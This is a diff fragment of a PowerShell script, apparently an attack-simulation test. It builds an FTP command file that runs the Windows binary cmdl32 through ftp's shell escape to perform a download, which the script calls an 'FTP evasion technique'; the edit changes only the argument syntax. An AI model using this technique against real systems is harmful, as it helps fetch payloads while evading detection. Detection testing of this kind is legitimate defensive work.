@@ -25,7 +25,7 @@ Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
 Write-Host "[*] Performing download with cmdl32 using FTP evasion technique"
 # Create FTP command content to execute cmdl32 indirectly
 $ftpCommand = @"
-!cmdl32 /vpn /lan "$tempDir\settings.txt"
+!cmdl32 -vpn -lan "$tempDir\settings.txt"
 bye
 "@
 Set-Content -Path "$tempDir\ftp_commands.txt" -Value $ftpCommand
